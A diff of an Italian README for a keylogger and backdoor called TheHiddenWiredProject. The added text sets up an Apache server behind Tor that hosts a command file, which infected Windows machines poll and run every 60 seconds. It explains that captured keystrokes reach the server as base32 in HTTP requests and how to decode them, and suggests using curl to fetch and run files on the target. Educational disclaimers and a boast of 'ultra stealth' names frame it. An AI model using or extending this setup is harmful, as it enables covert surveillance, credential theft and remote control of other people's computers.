@@ -1,4 +1,5 @@
 QUESTO PROGETTO É STATO CREATO SOLO A SCOPO EDUCATIVO E SPERIMENTALE, NON USARLO IN PC CHE NON APPARTENGONO AL TUO LAB VIRTUALE!
+ANCHE SE I NOMI SCELTI SONO ULTRA STEALTH NON SIGNIFICA CHE DEVE ESSERE USATO IN MODO SBAGLIATO!
 
 --------------------------------------- TheHiddenWiredProject ---------------------------------------
 
@@ -34,8 +35,23 @@ Creare e configurare il server Tor:
 
 # Per evitare problemi diventa root con "sudo su"
 
-# installa tor
-sudo apt install tor
+# installa apache e tor
+sudo apt install apache2 tor
+
+# esegue ad ogni avvio in automatico
+sudo systemctl enable apache2
+sudo systemctl enable tor
+
+# esegue i demoni
+sudo systemctl start apache2
+sudo systemctl start tor
+
+# configura il server apache
+cd /var/www/html
+sudo rm **
+sudo mkdir payloads_httpcmd
+cd payloads_httpcmd
+sudo nano default.txt (qui ci stanno i comandi che il target eseguirá ogni 60 secondi)
 
 # modifica il file torrc
 sudo nano /etc/tor/torrc
@@ -106,3 +122,28 @@ Come lo installo??
 6) Una volta trovata la pendrive esegui installer.bat
 7) Il PC si riavvierá da solo e TheHiddenWiredProject sará installato!
 8) Divertiti!!
+----------------------------------------------------------------------------------------------------
+
+Adesso come controllo i tasti premuti??
+I tasti premuti vengono salvati nel server su "/var/log/apache2/access.log" in base32 in stack da 32 caratteri, bisogna decodificare da base32 a plaintext, basta cercare su internet "base32 to text", incolli la request e vedi i tasti premuti.
+
+Esempio:
+root@debianVM:/var/log/apache2# cat access.log
+127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" 404
+127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/ORSXG5BBEE======" 404
+
+Prendiamo in considerazione solo la base 32, quindi questa: MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA
+se la decodifichiamo diventa: 
+
+stringa1: ciaoo, questo é un 
+stringa2: test!!
+----------------------------------------------------------------------------------------------------
+
+Mentre per eseguire codice nella macchina, tramite la backdoor, basta modificare il file: /var/www/html/payloads_httpcmd/default.txt
+e scrivere codice shell per windows, e verrá eseguito con i privilegi dell'utente corrente, possiamo anche scaricare file con curl ed eseguirli.
+Ma attenzione, devi fare in modo che il codice shell non venga eseguito in loop, perché cosí rischi di fare casino, quindi una volta che vedi 
+la richiesta del payload rimuovi il contenuto di default.txt, altrimenti il codice verrá eseguito ogni 60 secondi!!
+
+----------------------------------------------------------------------------------------------------
+
+DIVERTITI IN MODO ETICO E SANO, SENZA FARE DANNO!!
